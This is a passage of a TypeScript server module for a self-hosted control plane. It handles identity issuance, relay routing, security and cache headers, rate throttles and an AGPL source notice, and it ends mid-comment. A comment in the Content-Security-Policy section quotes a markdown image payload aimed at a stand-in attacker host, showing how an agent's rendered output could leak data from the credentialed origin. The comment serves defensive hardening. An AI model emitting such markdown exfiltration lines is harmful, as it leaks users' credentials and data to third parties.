import { existsSync } from "node:fs";
import { readFile } from "node:fs/promises";
import type { DatabaseSync } from "node:sqlite";
import { serveStatic } from "@hono/node-server/serve-static";
import { Hono, type Context, type MiddlewareHandler } from "hono";
import { bodyLimit } from "hono/body-limit";
import { ALL_SCOPES, AUTH_LEEWAY_MS, type Scope } from "../../../src/auth.js";
import { bearerToken, boundedInt, describeError, gzipResponses, jsonError, readJsonObject } from "../../../src/http.js";
import {
  RELAY_PROTOCOL_MIN_VERSION,
  RELAY_PROTOCOL_VERSION,
  parseAgentClis,
} from "../../../src/relay/protocol.js";
import { signToken, type TokenClaims } from "../../../src/token.js";
import {
  activePublicKeys,
  activeSigningKeys,
  burnMachineCodes,
  burnGranteeCodes,
  burnUserCodes,
  credentialMatches,
  ensureSigningKey,
  hashCredential,
  issueTunnelKey,
  keyPrefix,
  hasProvisioningKey,
  mintEnrollmentCode,
  mintProvisioningKey,
  mintSigningKey,
  newApiKey,
  newId,
  resolveProvisioningKey,
  retireSigningKey,
  signingKeyRows,
} from "./keys.js";
import {
  burnEmailTokens,
  claimEmailToken,
  deleteEmailState,
  emailOf,
  INVITE_TTL_MS,
  markVerified,
  mintEmailToken,
  readEmailToken,
  RESET_TTL_MS,
  setEmail,
  VERIFY_TTL_MS,
  verifiedOwnerOf,
} from "./emails.js";
import { checkEmailAddress, MAX_EMAIL_CHARS } from "./mail/address.js";
import { mailHealth, NOTICE_INTERVAL_MS, sentRecently, type MailSender } from "./mail/outbox.js";
import {
  emailChanged,
  emailVerify,
  invitation,
  lifetimeText,
  passwordReset,
  registrationConfirm,
  registrationNotice,
  testMessage,
  type Template,
} from "./mail/templates.js";
import {
  burnRegistration,
  claimRegistration,
  mintRegistration,
  nameTaken,
  nameTakenByAnother,
  pendingForEmail,
  REGISTRATION_TTL_MS,
} from "./registration.js";
import {
  checkSettingValue,
  clearSetting,
  emailDomainAllowed,
  envNameFor,
  isSettingKey,
  mailConfigured,
  parseEmailDomains,
  readSetting,
  readString,
  registrationMode,
  SECRET_SETTING_KEYS,
  SETTING_KEYS,
  writeSetting,
  type SettingKey,
} from "./settings.js";
import {
  createOwnedMachine,
  isUniqueViolation,
  labelIsWellFormed,
  labelOrName,
  MACHINE_LABEL_HELP,
  MACHINE_LABEL_RESERVED,
  MACHINE_LABEL_RESERVED_HELP,
  MAX_MACHINES_PER_USER,
  nameVisibleTo,
  nameVisibleToGrantees,
  ownerOf,
  relabelMachine,
  releaseOwner,
  resolveMachineRef,
  type OwnedMachine,
} from "./machines.js";
import { DEFAULT_TRUSTED_PROXY_HOPS, callerAddressOf } from "./net.js";
import {
  clearMachineLimit,
  effectiveLimit,
  instanceMachineLimit,
  machineCount,
  machineStanding,
  overLimitMachineIds,
  overLimitMachines,
  ownerDisabledMachineIds,
  writeMachineLimit,
} from "./quota.js";
import type { RelayView } from "./relay/registry.js";
import {
  checkPasswordPolicy,
  generatePassword,
  hashPassword,
  PasswordBusyError,
  verifyAgainstDecoy,
  verifyPassword,
} from "./password.js";
import { listSessions, mintSession, resolveSession, revokeAllSessions, revokeSession, touchSession } from "./sessions.js";
import {
  addressKey,
  ADDRESS_THROTTLE,
  confirmKey,
  enrollKey,
  LoginThrottle,
  loginKey,
  MAIL_THROTTLE,
  mailKey,
  mailTestKey,
  passwordChangeKey,
  provisionKey,
  registerKey,
  RESET_MAIL_THROTTLE,
  resetKey,
  resetMailKey,
  WRITE_THROTTLE,
  writeKey,
} from "./throttle.js";

/**
 * Where the source of the running program is, and which version this is.
 *
 * **This is an AGPL §13 obligation, not a courtesy link.** Section 13 requires
 * that anybody who interacts with a modified copy *over a network* be offered its
 * Corresponding Source. This service serves the web UI to exactly such people, so
 * the offer has to reach them — which means the signed-out screen, since a user
 * who cannot sign in is still a user under that clause.
 *
 * It is also the only lever the licence has. §13 is what stops somebody running a
 * closed fork of this as a service, and it only bites if their users can tell
 * that a source offer is owed to them. An instance that names no source teaches
 * them the opposite.
 *
 * ⚠ **Change `SOURCE_URL` if you run a modified copy.** Pointing at this
 * repository while serving your own build does not satisfy §13 — it is the
 * *running* version's source that has to be on offer, and naming somebody else's
 * is worse than naming none, because it looks answered.
 *
 * `VERSION` is a literal rather than a read of `package.json`, for the reason
 * `pincheck` gives about agent versions: a runtime file read is a new failure
 * path on a service whose whole point is not having one, and the image's own
 * `COPY` set is a thing that can be got wrong. `relaycheck` asserts this string
 * against `package.json` instead, so the two cannot drift silently.
 */
const SOURCE_URL = "https://github.com/rends-east/reemoat";
const VERSION = "0.5.0";

/**
 * Work a route answered before doing, still owed.
 *
 * `POST /v1/forgot` deliberately replies `{sent: true}` and *then* looks the owner
 * up, mints the token and queues the mail — see the route for why that is a
 * timing-oracle fix rather than an optimisation. What that trades away is
 * **durability**: before, the mint and the outbox INSERT had committed by the time
 * the 200 went out, so a crash or a deploy after the response still left a durable
 * row for the next boot's drain. Deferred, there is a window in which somebody has
 * been told their reset is on its way and nothing anywhere records it — on the one
 * flow that is the only way back into an account.
 *
 * The window that actually happens is a **restart**, not a crash, so the remedy is
 * a flush rather than a journal: `drainDeferred` runs what is still queued, and
 * `main.ts` calls it on SIGTERM before `store.close()`.
 *
 * ⚠ **Every deferred body must be synchronous**, which is what makes that flush a
 * few statements rather than an async shutdown path. It holds today because the
 * work is `verifiedOwnerOf`, `mintEmailToken` and `send` — all synchronous SQLite,
 * the mail pump being what talks to the network. A body that awaits would silently
 * stop being covered by the drain.
 */
const deferred = new Set<() => void>();

function defer(work: () => void): void {
  deferred.add(work);
  setImmediate(() => {
    // Gone means a drain already ran it. `delete` reports that, so the two paths
    // cannot both fire and mail the same person twice.
    if (!deferred.delete(work)) return;
    work();
  });
}

/** Run what is still owed, now. Returns how many. Safe to call more than once. */
export function drainDeferred(): number {
  const owed = [...deferred];
  deferred.clear();
  for (const work of owed) work();
  return owed.length;
}

/**
 * The control plane: identity issuance, a machine registry, and a fallback relay.
 *
 * It is **not consulted to verify anything, ever**. Daemons call `/v1/enroll`
 * exactly once and never again; every token after that is verified locally
 * against a public key the daemon already holds. This service being down cannot
 * stop a token verifying, a session running, or a daemon starting. That is the
 * load-bearing half of the original design and it is untouched.
 *
 * The other half used to read "it is never in the data path", and that is no
 * longer true, so it should not still be written here. Daemons behind NAT are not
 * reachable from a browser at all, and identity without reachability is not a
 * product. The honest statement is narrower:
 *
 *   - Direct is the default route. A client that can reach a daemon does, and
 *     nothing about that request touches this service.
 *   - The relay is a fallback, on its own port, carrying opaque bytes down a
 *     tunnel the daemon dialled out. It is a data path when there is no other one.
 *   - Being on the data path buys the one thing a generic tunnel cannot do: this
 *     service knows that user X may reach machine Y, and checks it before a byte
 *     moves.
 *
 * What still must never happen: this service aggregating sessions across
 * machines, storing transcripts, or being asked whether a token is valid.
 */

/** The default lifetime of an issued token. */
export const DEFAULT_TOKEN_TTL_SECONDS = 300;

/**
 * Below this, the clock leeway starts to dominate the lifetime.
 *
 * A token is accepted over `[nbf - leeway, exp + leeway]`, so a 60-second token
 * with 60 seconds of leeway either side is really a 180-second token. Refusing
 * to mint one is how "5 minutes" stays a true statement rather than a rounding
 * error, and it is why this floor is derived from the daemon's leeway constant
 * instead of being a number typed in twice.
 */
export const MIN_TOKEN_TTL_SECONDS = (2 * AUTH_LEEWAY_MS) / 1000;

const ENROLLMENT_CODE_TTL_MS = 60 * 60 * 1000;

/**
 * The two credential shapes, as the three characters that tell them apart.
 *
 * Named rather than written inline at the one place that reads them, because the
 * literal is shared with `newApiKey`/`newSessionToken` in `keys.ts` and with
 * `keyPrefix`'s `slice(3, 11)`. Three facts, one length.
 */
const API_KEY_PREFIX = "rk_";
const SESSION_PREFIX = "rs_";

/**
 * The most an unauthenticated caller may send.
 *
 * **Every route registered above THE LINE that takes a body** — stated as the
 * rule rather than as a count, because the count was "two" and is now seven, and
 * a number written here goes stale on the next public route while reading as
 * though somebody checked. Those are the only places in this service where
 * somebody whose credential the gate cannot resolve decides how many bytes it
 * reads, and none of them was bounded before this constant.
 *
 * The bodies are small by construction: a name and a password, one enrollment
 * code, an address, a mailed token, a provisioning key. 64 KiB is enormous for
 * all of them and small enough that the answer to "how much can a stranger make
 * this process buffer" is a number.
 */
const PUBLIC_BODY_LIMIT_BYTES = 64 * 1024;

/**
 * The most anybody past THE LINE may send, which had no bound at all.
 *
 * `bodyLimit` guarded the two public routes and nothing else, on the reasoning
 * that a caller below the line has a credential. That is a statement about *who*
 * is asking and not about *how much* — every authenticated route calls
 * `readJsonObject`, which buffers the whole body before it looks at it, on the
 * process that carries every relay tunnel in the fleet. One caller holding one
 * valid session could therefore make this service hold as many bytes as it cared
 * to send, and the remedy would be revoking a credential it already has.
 *
 * Wider than the public limit because the caller is vetted and because a future
 * route may legitimately carry more than a name and a password, and small enough
 * that "how much can one signed-in caller make this process buffer" is a number.
 * The largest body any route here reads today is a grant with every scope, which
 * is well under a kilobyte.
 */
const BODY_LIMIT_BYTES = 256 * 1024;

/** An answer over this is refused rather than truncated. See `POST /v1/me/password`. */
const MAX_PASSWORD_FIELD_CHARS = 512;

/**
 * How many live API keys one account may hold.
 *
 * New with `POST /v1/me/keys`, and needed because nothing bounded this table
 * before: only an admin could write to it, and an admin minting a thousand keys
 * is a different problem. Every other credential in this service either
 * supersedes its predecessor (`mintEnrollmentCode`, `issueTunnelKey`) or evicts
 * past a cap (`mintSession`); a self-service minter with no bound would be the
 * only unbounded growth in the database that holds the fleet signing key.
 *
 * Ten rather than one, because a key is per *place* — a laptop, a CI job, a
 * script — and superseding would break the other nine.
 */
const MAX_KEYS_PER_USER = 10;

/**
 * What a user name may be, now that it is also a login.
 *
 * It used to be any non-empty string up to 200 characters, which was fine while
 * the name was a label an admin typed once. It is now typed into a sign-in form
 * and it qualifies machine labels, so two characters are excluded on purpose:
 * `/`, which would make `<owner>/<label>` ambiguous, and leading or trailing
 * space, which produces a credential nobody can see is wrong.
 *
 * Existing names are **not** re-validated — this is checked at creation only, so
 * a database written before this rule keeps working. That is the same choice
 * `machine_owners` makes about machines that predate it.
 */
const USER_NAME = /^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$/;

/**
 * The refusal sentence for a malformed user name, said once.
 *
 * The same treatment `MACHINE_LABEL_HELP` got one module over, and for the same
 * reason before rather than after the drift: the machine sentence was written
 * out at four call sites and had already come apart into two wordings for one
 * regex. A sentence that describes a constant belongs beside the constant, so
 * the second route to test `USER_NAME` cannot explain it differently from the
 * first.
 */
const USER_NAME_HELP = "name may contain letters, digits, and . _ - only, and must start with a letter or digit";

/**
 * Grant listing page size.
 *
 * Grants are users × machines, so this is the one admin list that grows with the
 * product of the fleet rather than with either side of it. The response carries
 * `total`, so a caller can always tell a page from the whole set.
 */
const DEFAULT_GRANT_PAGE = 500;
const MAX_GRANT_PAGE = 2000;

/**
 * A single-use link whose conditional `UPDATE` matched nothing.
 *
 * Exists so `POST /v1/reset` and `POST /v1/me/email/verify` can claim the token
 * **inside** their transaction and still answer `409 token_unusable`. It also
 * carries the other conditional write in those blocks: `markVerified` matching
 * nothing means the address moved underneath the reads above, which is the same
 * answer — this link cannot be spent now — reached from the other end.
 *
 * A plain `return` from between `BEGIN` and
 * `COMMIT` is the shape this file refuses everywhere — what an un-rolled-back
 * `BEGIN` takes out is the *next* writer on the shared connection — so the one
 * exit is the `ROLLBACK` in the `catch`, and this is how the two failures that
 * land there are told apart from each other and from a real throw.
 *
 * Private to this module: it is a control-flow marker, not a reportable error,
 * and nothing outside the one `catch` should ever see it.
 */
class TokenNotClaimed extends Error {
  constructor() {
    super("email token was already spent");
    this.name = "TokenNotClaimed";
  }
}

export interface ControlPlaneOptions {
  db: DatabaseSync;
  issuer: string;
  tokenTtlSeconds: number;
  /**
   * The public origin of the relay, or `null` when the relay is switched off.
   *
   * Handed to daemons at enrollment and to clients with their token. `null` here
   * means every machine reports `relayOnline: false` and clients see the direct
   * path or nothing — which is the pre-relay behaviour exactly.
   */
  relayUrl?: string | null;
  /**
   * Where a browser reaches each relay, by `relay_id`.
   *
   * Absent — the default — means there is one relay and `relayUrl` is it, which
   * is every deployment that has not split. Present, it is what turns
   * `relay_tunnels.relay_id` into somewhere a client can dial; see
   * `relayUrlFor`.
   *
   * Separate from `relayUrl` rather than replacing it, because the two answer
   * different questions and only one of them is per-machine: `relayUrl` is the
   * name **daemons** dial and is baked into `identity.relay_url` at enrollment,
   * so it must stay one value for the life of a fleet.
   */
  relayUrls?: Record<string, string> | null;
  /**
   * Where the plugin catalogue lives, or `null` for an instance that has none.
   *
   * ⚠ **Env only, and deliberately not a `SETTING_KEYS` row.** Every other
   * product-shaped value on this service is env-seeded and database-owned, so
   * that an admin can change it without a redeploy — and this one may not be,
   * because it has to appear in `connect-src`. The CSP is built **once**, at app
   * construction, from this value; a row an admin could write would let them name
   * a catalogue the document's own header then refuses to reach, and the symptom
   * would be a screen that stays empty with an error only the browser console
   * carries. One source, one restart, no way for the two to disagree.
   *
   * `null` is an ordinary state rather than a misconfiguration: the market tab
   * says there is no catalogue and everything else about plugins keeps working,
   * because installing from a file never involved this at all.
   */
  pluginCatalogueUrl?: string | null;
  /** Live tunnel state, or `null` when the relay is switched off. */
  relay?: RelayView | null;
  /**
   * Absolute path to the built web client, or `null`/missing to serve no UI.
   *
   * A missing directory is not an error: `pnpm cp` has to start in a checkout
   * that has never run a frontend build, and refusing to would make the API
   * depend on a bundler.
   */
  webRoot?: string | null;
  /**
   * Absolute path to `deploy/bootstrap.sh`, or `null`/missing to serve no
   * installer.
   *
   * `null` by default so `relaycheck`, which builds apps directly, needs no
   * change and no fixture: an option nobody passes registers no route. `main.ts`
   * resolves the real path the same way it resolves `webRoot` — from its own
   * file URL rather than the working directory — and `REEMOAT_CP_INSTALL=0`
   * switches it off.
   */
  bootstrapScript?: string | null;
  /**
   * Where outgoing mail goes, or `null` on an instance that cannot send.
   *
   * An interface rather than the pump itself, exactly as `relay` above is a
   * `RelayView` rather than a `TunnelRegistry`. Two things follow. `relaycheck`
   * passes a recording fake, which is what makes the one property about mail an
   * offline driver *can* reach assertable: **a mailer that never resolves cannot
   * change a route's status or its timing**, because no route awaits a send.
   * And `main.ts` decides what a pump is, so nothing in this file knows there is
   * a socket at the other end.
   */
  mail?: MailSender | null;
  /**
   * How many reverse proxies of your own stand in front of this listener.
   *
   * Decides how much of `x-forwarded-for` is believed, and therefore what every
   * throttle key's address half actually is — see `net.ts`. Zero, the default,
   * ignores the header outright. An option rather than a `process.env` read in
   * here for the reason `relayUrl` and `mail` are options: `relaycheck` drives
   * this app directly and has to be able to set it.
   */
  trustedProxyHops?: number;
}

interface Caller {
  userId: string;
  name: string;
  isAdmin: boolean;
  /**
   * Which credential got here.
   *
   * Both are full authority and nothing branches on this for *authorization* —
   * but signing out has to know there is a session to revoke, and `/v1/me`
   * reporting it is what lets a client tell "I am signed in" from "this shell has
   * an API key exported".
   */
  via: "api_key" | "session";
  /** The session row, or `null` under an API key. */
  sessionId: string | null;
}

type AppEnv = { Variables: { caller: Caller } };

export function createControlPlaneApp(options: ControlPlaneOptions): Hono<AppEnv> {
  const { db, issuer, tokenTtlSeconds } = options;
  const relayUrl = options.relayUrl ?? null;
  const relayUrls = options.relayUrls ?? null;
  const pluginCatalogueUrl = options.pluginCatalogueUrl ?? null;
  const relay = options.relay ?? null;
  const trustedProxyHops = options.trustedProxyHops ?? DEFAULT_TRUSTED_PROXY_HOPS;
  const app = new Hono<AppEnv>();

  /*
   * gzip, first, so it wraps every route below including `serveStatic`.
   *
   * **It has to be here rather than in `main.ts`**, for the reason that file's own
   * `fetchWithProxyWarning` docblock gives about itself: Hono runs handlers in
   * registration order, so an `app.use("*")` added after this function has
   * registered everything would sit below all of it and never run.
   *
   * The web bundle is the reason it earns its place here as well as on the daemon:
   * 625 KB raw against 187 KB gzipped, and it is the *first* thing a phone fetches,
   * before a single event of any transcript.
   */
  app.use("*", gzipResponses());

  /*
   * Response headers, second, and **unconditionally**.
   *
   * ⚠ **This sat inside `if (webRoot !== null && existsSync(webRoot))`, at the
   * bottom of the file, and both halves of that were wrong.** An instance with
   * `REEMOAT_CP_WEB=0` — the deployed shape whenever the bundle is served by
   * something else — registered no header middleware at all. And registration
   * order decides more than the guard did: Hono composes the handlers that match
   * a request in the order they were added and a route handler returns without
   * calling `next()`, so an `app.use("*")` registered *below* every `/v1` route
   * never ran for one. The policy reached `serveStatic` and the SPA fallback and
   * nothing else, which is why `/v1/*` JSON went out bare in **both**
   * configurations. Up here it wraps everything, the same argument
   * `gzipResponses` above it already makes about itself.
   *
   * `nosniff` and `Referrer-Policy` on every response, whatever the status: the
   * first is about a body a browser might decide is HTML — which includes an
   * error envelope — and the second about a URL that may carry a machine or
   * session id into somebody else's logs. **No HSTS**: TLS terminates at a proxy
   * this process cannot see, so whether the whole origin is pinned to https is a
   * deployment decision and belongs in the deployment.
   */
  /*
   * Cache headers, and their absence was a real bug rather than an omission.
   *
   * Nothing here sent `Cache-Control`, `ETag` or `Last-Modified` — measured on
   * the running instance, the response headers were `content-length`,
   * `content-type`, `Date` and nothing else. With no directives and no
   * validator a browser falls back to *heuristic* caching: it may serve a
   * response from disk without revalidating, for as long as it likes.
   *
   * For `index.html` that is the whole deployment gone. The page names hashed
   * chunks, so a stale copy pins the client to a build the server has already
   * deleted — and because the browser holds those chunks too, it never asks and
   * never 404s. It simply keeps running the old app. Diagnosed the hard way: a
   * fix was deployed, verified in the *served* bundle by fetching it, and the
   * reporter went on seeing the old behaviour through repeated reloads. Every
   * check said the server was right, and the server was right.
   *
   * `no-cache` and not `no-store`: revalidate before use, so a 304 still costs
   * nothing once a validator exists. The file is 1.5 KiB, and this is the one
   * request that decides which build a client runs.
   *
   * Hashed assets get the opposite, and it is safe for the same reason it is
   * needed: the filename contains a hash of the contents, so the URL cannot
   * outlive the bytes. `immutable` is what stops a reload re-fetching half a
   * megabyte of JavaScript over LTE on a phone.
   *
   * After `next()` because that is when the response exists. `c.res.headers` is
   * writable on the way out; nothing here replaces the body, so a streamed file
   * stays streamed.
   */
  /*
   * **The content type decides first, and the URL only after it.** This was the
   * other way round, and the order was a defect rather than a preference.
   *
   * `/assets/` was tested first and returned, so *anything* answered 200 under
   * that prefix took the immutable arm whatever had actually been served. And
   * something is: `looksLikeAsset` only refuses paths whose last segment has a
   * dot, so an extensionless `/assets/foo` missed `serveStatic`, missed that
   * refusal, and was answered by the SPA fallback with `index.html` — which
   * then received a one-year immutable *public* directive on the exact file
   * this middleware exists to keep fresh, poisoning any shared cache in front.
   *
   * Asking what was served rather than what was asked for makes that
   * structurally impossible instead of merely unlikely: an HTML body can never
   * take the immutable arm, from any URL. The fallback additionally refuses the
   * whole `/assets/` namespace now, so the case cannot arise there either —
   * two independent answers, because this one is also the cheaper of the two to
   * keep correct if the fallback's rules change again.
   */
  /*
   * The one policy this app has ever had, and it is defence in depth rather
   * than the fix for anything.
   *
   * What prompted it: agent markdown reached react-markdown's default `<img
   * src>`, so `![](https://attacker/?d=…)` was a request to a host the *agent*
   * chose, issued on render, with no interaction, from the origin holding
   * `reemoat.credential`. `Markdown.tsx` now draws an image as text and that is
   * the actual repair — this is what catches the next sink instead of the next
   * audit doing it. There was no `Content-Security-Policy` anywhere in this
   * repository before.
   *
   * **`connect-src` is the directive that can break everything**, because this
   * page is deliberately cross-origin to the fleet: `cp.ts` talks to this
   * origin and `machine.ts` talks to the *relay*, over both `https` and `wss`.
   * So the relay is listed from `relayUrl` rather than written down, and its
   * WebSocket origin is derived from the same URL — `https` and `wss` are
   * different sources to CSP, and listing one is listing neither in practice.
   * When there is no relay URL the directive is `'self'` alone, which is
   * exactly what such an instance can reach.
   *
   * `img-src` keeps `blob:` because `ImagePreview` builds one from bytes it
   * fetched with a header, which is the *supported* way to see a file and must
   * keep working; `data:` is not needed by the built bundle (measured — no
   * `url(data:` in the emitted CSS) and is left out. `script-src 'self'` is
   * safe because Vite emits external modules and the built `index.html` carries
   * no inline script. `style-src` keeps `'unsafe-inline'` for style attributes,
   * which is the one relaxation here and buys nothing to an attacker who
   * cannot already run script.
   *
   * On the **document** only, and that is unchanged by the move above. A policy
   * on a JS or CSS response governs nothing, and one on a JSON response governs
   * nothing either — it would only invite somebody to reason about it.
   */
  const relayOrigins = connectOrigins(relayUrl, relayUrls);
  /*
   * ⚠ **The plugin market reaches two hosts, and one of them needs two
   * directives.** `catalogueOrigin` is where the list of official plugins comes
   * from; `PLUGIN_MANIFEST_ORIGIN` is where a plugin's own `plugin.json` and its
   * icon are read from, at the commit the catalogue pinned — which is what makes
   * the permissions somebody consents to provably belong to the code being
   * installed, rather than to a summary a service typed out.
   *
   * ⚠ **`raw.githubusercontent.com` is in `img-src` as well as `connect-src`, and
   * the pair is the point.** A manifest is a `fetch` and an icon is an `<img>`,
   * and CSP treats those as different questions. Getting only `connect-src` right
   * is the failure mode that reads as working: every permission list renders, and
   * every icon on the market screen is silently blank, with the reason only in a
   * console nobody has open on a phone.
   *
   * Both are absent entirely on an instance with no catalogue configured, which
   * is exactly what such an instance can reach — `connectOrigins`' own posture one
   * value over.
   */
  const catalogueOrigin = originOf(pluginCatalogueUrl);
  const marketOrigins = catalogueOrigin === null ? "" : ` ${catalogueOrigin} ${PLUGIN_MANIFEST_ORIGIN}`;
  const marketImages = catalogueOrigin === null ? "" : ` ${PLUGIN_MANIFEST_ORIGIN}`;
  /*
   * ⚠ **The one third-party origin that is not conditional on a setting.** Every
   * instance compiles in the same `SYSTEMS`, so every instance's model picker
   * reads this one list — `packages/web/src/openrouter.ts` says why the daemon
   * does not proxy it. An instance that omitted it would draw a provider whose
   * section never fills, with the reason only in a console nobody has open on a
   * phone; that is the market's `img-src` failure again, one directive over.
   *
   * `connect-src` only, and the contrast with the market above is the reason: this
   * reads JSON with `fetch` and draws no icon, so `img-src` is untouched.
   */
  const MODEL_CATALOGUE_ORIGIN = "https://openrouter.ai";
  const csp = [
    "default-src 'self'",
    "script-src 'self'",
    "style-src 'self' 'unsafe-inline'",
    `img-src 'self' blob:${marketImages}`,
    "font-src 'self'",
    `connect-src 'self'${relayOrigins}${marketOrigins} ${MODEL_CATALOGUE_ORIGIN}`,
    "object-src 'none'",
    "base-uri 'self'",
    "form-action 'self'",
    "frame-ancestors 'none'",
  ].join("; ");

  app.use("*", async (c, next) => {
    await next();
    c.res.headers.set("x-content-type-options", "nosniff");
    c.res.headers.set("referrer-policy", "no-referrer");
    if (c.res.status !== 200) return;
    if ((c.res.headers.get("content-type") ?? "").includes("text/html")) {
      c.res.headers.set("cache-control", "no-cache");
      c.res.headers.set("content-security-policy", csp);
      /*
       * `X-Frame-Options` beside `frame-ancestors`, which supersedes it, because
       * the two are not read by the same set of browsers and the cost of the
       * older one is a header. Clickjacking is not a generic risk on this
       * document: it approves shell commands with a tap, so a framed copy is
       * somebody else choosing what you approve.
       *
       * `Permissions-Policy` denies what this app never asks for. Nothing here
       * uses a camera, a microphone, a location or a payment handler, so the
       * honest policy is the empty one — and stating it means a dependency that
       * starts asking has to come here first.
       */
      c.res.headers.set("x-frame-options", "DENY");
      c.res.headers.set("permissions-policy", "camera=(), microphone=(), geolocation=(), payment=(), usb=()");
      return;
    }
    if (c.req.path.startsWith("/assets/")) {
      c.res.headers.set("cache-control", "public, max-age=31536000, immutable");
    }
  });

  /**
   * Best effort, and no longer only for the audit trail.
   *
   * ⚠ **This was a module-level function and its docblock said "never used for a
   * decision".** It is used for one on every public route in this file: it is
   * half of `loginKey` and the whole of `addressKey`, and a `429` is a refusal.
   * Reading `x-forwarded-for` unconditionally therefore let a caller choose their
   * own rate-limit bucket, and spell somebody else's. `net.ts` owns the rule and
   * this is the two-line adapter; what moved it in here is `trustedProxyHops`,
   * which is per app instance because `relaycheck` drives several.
   *
   * `c.env` is `unknown` — that driver goes through `app.request()`, where there
   * is no socket at all — so the shape is asserted rather than declared, and
   * every branch of the pure half is covered there instead.
   */
  const callerAddress = (c: Context): string => {
    const incoming = (c.env as { incoming?: { socket?: { remoteAddress?: string } } } | undefined)?.incoming;
    return callerAddressOf(c.req.header("x-forwarded-for"), incoming?.socket?.remoteAddress, trustedProxyHops);
  };

  /**
   * Whether a machine is reachable right now, which is one question again.
   *
   * It used to be deliberately *two*: a machine with no tunnel could still be
   * reachable on its own `baseUrl`, so collapsing them would have told somebody
   * their machine was down while it sat on the same LAN. There is no `baseUrl`
   * any more — the relay is the only entrance — so holding a tunnel is now the
   * whole of being reachable.
   */
  const relayOnline = (machineId: string): boolean => relay !== null && relay.isOnline(machineId);

  /**
   * When a machine was last known to be connected.
   *
   * A separate table written by the relay, because presence is *deleted* on
   * disconnect — that is what makes it presence, and no column on `machines` can
   * express the absence of a row. `store.ts` has a `migrate()` now, so a column
   * here is possible where it once was not; it is still the wrong shape.
   *
   * Read per row rather than as a set, matching the single-machine routes around
   * it; the listing that would be N+1 is `GET /v1/admin/machines`, which is
   * bounded by the fleet and already does the same for `relayUrlFor`.
   */
  const lastSeenStmt = db.prepare("SELECT at FROM machine_last_seen WHERE machine_id = ?");
  const lastSeenAt = (machineId: string): number | null => {
    try {
      const row = lastSeenStmt.get(machineId);
      return row === undefined ? null : Number(row["at"]);
    } catch {
      // Bookkeeping, not authorization. A database that will not answer this must
      // not fail the listing that carries it — `null` is the honest "cannot tell"
      // and is what an instance predating the table answers anyway.
      return null;
    }
  };

  /**
   * Where a **browser** should reach this particular machine.
   *
   * `relayUrl` is one value and always was, which is correct while there is one
   * relay and wrong the moment there are two: a `TunnelRegistry` is in-memory
   * per process, so a request that lands on relay B for a machine held by relay
   * A answers `503 no_tunnel`. With every relay behind one name that is a
   * one-in-N coin flip on every request — recoverable, because the client drops
   * its route belief on that code and re-probes, but a client that guesses is
   * not a design.
   *
   * So the URL is resolved through the thing that already knows:
   * `relay_tunnels.relay_id`, written by whichever relay holds the tunnel and
   * read back by `dbRelayView.relayFor`. `relayUrls` maps that slot name to
   * somewhere a browser can dial.
   *
   * **Three ways to land on the default, and all three are right.** No map
   * configured — the single-relay shape, which is every deployment until
   * somebody splits. No tunnel — there is nothing to be routed *to*, and the
   * answer rides beside `relayOnline: false` which is what the client acts on.
   * A slot with no entry — an operator added a relay and not its URL, and
   * sending the browser to the shared name is the same coin flip it had before,
   * rather than a `null` no client field is typed for.
   *
   * **Deliberately not used at enrollment.** A daemon dials one name for the
   * life of its identity (`identity.relay_url`, written once and never asked
   * about again), so it must keep getting the shared one; which relay accepts
   * it is the load balancer's business and the daemon's indifference is the
   * property that makes adding relays invisible to the fleet.
   */
  const relayUrlFor = (machineId: string): string | null => {
    if (relay === null || relayUrls === null) return relayUrl;
    const slot = relay.relayFor(machineId);
    if (slot === null) return relayUrl;
    // `Object.hasOwn`, not `relayUrls[slot] ?? …`: a slot named `toString` or
    // `constructor` would otherwise resolve to an inherited function, `??` would
    // not fire, and `c.json` drops a function field entirely — the one machine
    // in the fleet answering with no `relayUrl` at all.
    return Object.hasOwn(relayUrls, slot) ? relayUrls[slot]! : relayUrl;
  };

  /**
   * Per app instance, which is per process.
   *
   * Not a module-level singleton: `relaycheck` builds several apps against several
   * in-memory databases, and a shared counter would make one section's failed
   * logins block another's. Nothing about this is durable — see `throttle.ts` for
   * why that is the design rather than a shortcut.
   */
  const throttle = new LoginThrottle();

  /**
   * The backstop, and it is a **second instance rather than a second key**.
   *
   * `ADDRESS_THROTTLE` is a looser threshold, because this counter is shared by
   * everybody who appears to be at one address — a NAT, an office, a proxy that
   * forwards nothing. Feeding an address key into `throttle` would count it
   * against five failures, which is one person's bad afternoon locking out a
   * building; feeding an identity key into this one would let five hundred
   * guesses at a single account go unmet. Two thresholds, so two instances.
   *
   * What it catches is the shape a per-identity counter structurally cannot: one
   * host spraying a thousand *distinct* names never reaches a per-identity
   * threshold, so before this every one of those guesses reached the KDF.
   */
  const addressThrottle = new LoginThrottle(ADDRESS_THROTTLE);

  /**
   * How much mail one address may be sent, and it is a **third** instance for the
   * reason there is a second one: two thresholds, two instances.
   *
   * It also counts a different event. Everything above counts *failures*, because
   * that is what a guess looks like. A mail bomb is a sequence of successes — each
   * request works perfectly and the harm is that it worked — so the routes below
   * record against this on the way to sending and never call `succeed`.
   */
  const mailThrottle = new LoginThrottle(MAIL_THROTTLE);

  /**
   * Reset mail alone, and a **fourth** instance for a reason the third does not
   * cover: this is the only budget whose exhaustion removes a capability rather
   * than delaying one. `RESET_MAIL_THROTTLE` carries the argument.
   */
  const resetMailThrottle = new LoginThrottle(RESET_MAIL_THROTTLE);

  /**
   * What a signed-in caller may write, per minute, per route.
   *
   * The fifth instance in this file and the first that counts an *authenticated*
   * caller. See `WRITE_THROTTLE` for why the shape differs from every other one
   * here — those bound guessing, this bounds cost.
   */
  const writeThrottle = new LoginThrottle(WRITE_THROTTLE);

  /**
   * Spend one write slot, or the refusal to return.
   *
   * `null` means "carry on", which is the shape that lets a route guard itself in
   * two lines at the top rather than wrapping its body. Recorded with `fail`
   * because there is nothing to succeed at: `succeed` exists so a correct
   * password un-records its own attempt, and a legitimate write is still a write.
   *
   * Deliberately not an `app.use`. A blanket middleware would have to decide from
   * the method and path which requests are expensive, i.e. rebuild the list every
   * time a route is added, and it would count the reads this client makes
   * constantly — `GET /v1/machines` every wake, `GET /v1/me`. Call sites that say
   * why they are there is the smaller thing to keep true.
   *
   * There are **seven**, and there were two. `POST /v1/machines` and
   * `POST /v1/machines/:id/revoke` are a loop that costs three fsync'd
   * transactions a turn under `PRAGMA synchronous = FULL`, on the file the relay
   * shares, and leaves permanent rows behind either way; `POST /v1/me/keys` and
   * `DELETE /v1/me/keys/:keyId` are the same loop over the table holding this
   * service's permanent credentials.
   *
   * ⚠ **The seventh is `PATCH /v1/machines/:id`, and it was missed while this
